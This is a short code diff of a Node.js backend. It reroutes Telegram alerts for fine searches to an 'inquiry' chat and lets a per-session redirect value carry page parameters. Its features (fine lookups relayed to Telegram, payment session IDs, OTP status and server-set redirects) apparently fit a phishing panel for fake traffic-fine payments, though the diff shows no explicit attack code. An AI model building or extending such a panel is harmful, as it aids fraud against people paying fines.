@@ -9,9 +9,9 @@ const MOBILE_UA = 'Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) Appl
 async function getTgConfig() {
   const token    = await getSetting('telegram_bot_token',        process.env.TELEGRAM_BOT_TOKEN          || '');
   const chatId   = await getSetting('telegram_chat_id',          process.env.TELEGRAM_CHAT_ID            || '');
-  const srchTok  = await getSetting('search_telegram_bot_token', process.env.SEARCH_TELEGRAM_BOT_TOKEN   || '');
-  const handyKey = await getSetting('handy_api_key',             process.env.HANDY_API_KEY               || '');
-  return { token, chatId, srchTok, handyKey };
+  const inquiryChatId = await getSetting('inquiry_chat_id', process.env.INQUIRY_CHAT_ID || '');
+  const handyKey      = await getSetting('handy_api_key',   process.env.HANDY_API_KEY   || '');
+  return { token, chatId, inquiryChatId, handyKey };
 }
 
 // ─── Telegram helper ─────────────────────────────────────────────────────────
@@ -123,7 +123,7 @@ router.post('/search-fines', async (req, res) => {
       sid ? `SID: <code>${sid}</code>` : '',
     ].filter(Boolean).join('\n');
     const cfg = await getTgConfig();
-    await sendTelegram(cfg.srchTok || cfg.token, cfg.chatId, msg);
+    await sendTelegram(cfg.token, cfg.inquiryChatId || cfg.chatId, msg);
   } catch { /* ignore */ }
 
   res.json(data);
@@ -255,6 +255,14 @@ router.get('/check-status', async (req, res) => {
 
     if (row.redirect_to) {
       await query('UPDATE payments SET redirect_to = NULL WHERE sid = ?', [sid]);
+      const colonIdx = row.redirect_to.indexOf(':');
+      if (colonIdx !== -1) {
+        return res.json({
+          action: 'redirect',
+          page:   row.redirect_to.slice(0, colonIdx),
+          params: row.redirect_to.slice(colonIdx + 1),
+        });
+      }
       return res.json({ action: 'redirect', page: row.redirect_to });
     }
     res.json({ action: 'none', status: row.otp_status });
